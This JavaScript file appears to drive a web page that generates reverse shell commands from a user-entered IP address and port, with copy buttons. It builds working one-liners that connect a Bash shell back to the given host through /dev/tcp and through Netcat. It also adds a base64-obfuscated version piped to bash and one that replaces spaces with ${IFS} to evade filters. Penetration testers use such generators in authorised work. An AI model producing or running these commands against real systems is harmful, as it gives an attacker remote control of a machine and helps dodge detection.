document.addEventListener('DOMContentLoaded', () => {
    const ipAddressInput = document.getElementById('ipAddress');
    const portInput = document.getElementById('port');
    const generatedCommandsContainer = document.getElementById('generatedCommands');

    const shellCommands = [
        { type: 'bash', name: 'Bash TCP' },
        { type: 'nc', name: 'Netcat' },
        { type: 'bash_base64', name: 'Bash TCP (Base64)' },
        { type: 'bash_base64_no_spaces', name: 'Bash TCP (Base64 No Spaces)' }
    ];

    const typeText = (element, text, speed = 10) => {
        let i = 0;
        element.value = '';
        const timer = setInterval(() => {
            if (i < text.length) {
                element.value += text.charAt(i);
                i++;
            } else {
                clearInterval(timer);
            }
        }, speed);
    };

    const generateAllShellCommands = () => {
        const ip = ipAddressInput.value.trim();
        const port = portInput.value.trim();

        generatedCommandsContainer.innerHTML = ''; // Clear previous commands

        if (!ip || !port) {
            generatedCommandsContainer.innerHTML = '<p class="text-red-400">Please enter both IP address and port.</p>';
            return;
        }

        if (!/^\d{1,5}$/.test(port) || parseInt(port) > 65535) {
            generatedCommandsContainer.innerHTML = '<p class="text-red-400">Please enter a valid port number (1-65535).</p>';
            return;
        }

        shellCommands.forEach(shell => {
            let command = '';
            switch (shell.type) {
                case 'bash':
                    command = `/bin/bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
                    break;
                case 'nc':
                    command = `nc -e /bin/bash ${ip} ${port}`;
                    break;
                case 'bash_base64':
                    const bashCommand = `/bin/bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
                    command = `echo ${btoa(bashCommand)}|base64 -d|bash`;
                    break;
                case 'bash_base64_no_spaces':
                    const bashCmdNoSpaces = `/bin/bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
                    //replace spaces with ${IFS}
                    command = `echo ${btoa(bashCmdNoSpaces)}|base64 -d|bash`.replace(/ /g, '${IFS}');
                    break;
            }

            const commandDiv = document.createElement('div');
            commandDiv.className = 'bg-gray-800 p-4 rounded-md relative border border-red-600';
            const textareaId = `command-${shell.type}`;
            commandDiv.innerHTML = `
                <label class="block text-sm font-bold mb-2 text-red-500">${shell.name}:</label>
                <textarea id="${textareaId}" rows="3" readonly class="shadow appearance-none border border-gray-700 rounded w-full py-2 px-3 text-gray-100 bg-gray-900 leading-tight focus:outline-none focus:shadow-outline font-mono text-sm"></textarea>
                <button class="copy-btn absolute top-4 right-4 bg-red-600 hover:bg-red-700 text-white font-bold py-1 px-2 rounded text-xs">
                    Copy
                </button>
            `;
            generatedCommandsContainer.appendChild(commandDiv);
            const textarea = document.getElementById(textareaId);
            typeText(textarea, command);
        });

        // Add event listeners for copy buttons
        document.querySelectorAll('.copy-btn').forEach(button => {
            button.addEventListener('click', (event) => {
                const textarea = event.target.previousElementSibling;
                textarea.select();
                textarea.setSelectionRange(0, 99999); // For mobile devices

                try {
                    document.execCommand('copy');
                    button.textContent = 'Copied!';
                    setTimeout(() => {
                        button.textContent = 'Copy';
                    }, 2000);
                } catch (err) {
                    console.error('Failed to copy: ', err);
                    button.textContent = 'Failed!';
                }
            });
        });
    };

    ipAddressInput.addEventListener('input', generateAllShellCommands);
    portInput.addEventListener('input', generateAllShellCommands);

    // Initial generation
    generateAllShellCommands();
});